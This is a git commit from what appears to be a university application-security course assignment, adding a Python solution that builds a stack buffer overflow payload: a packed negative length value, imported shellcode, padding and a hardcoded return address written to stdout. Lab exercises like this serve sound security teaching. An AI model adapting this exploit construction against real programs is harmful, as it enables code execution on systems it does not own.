1e380b72d35e8daa7a3356796cd869ff96863f59
Dipayan <dipayan2@illinois.edu>
2020-09-06 15:32:25 -0500

    1.2.5 Done

--- AppSec/1.2.5.py
+++ AppSec/1.2.5.py
@@ -5,3 +5,11 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+shell_len = len(shellcode)
+padding_len = (44 - shell_len)
+output=(pack("<i",-1))+shellcode+(b"\x32"*padding_len) + b"\x40\xb3\xfe\xff"  
+sys.stdout.buffer.write(output)
+#sys.stdout.buffer.write(pack("<I", -1))
+#sys.stdout.buffer.write(pack("<I", 25))
+#sys.stdout.buffer.write(pack("<I", 32))
+
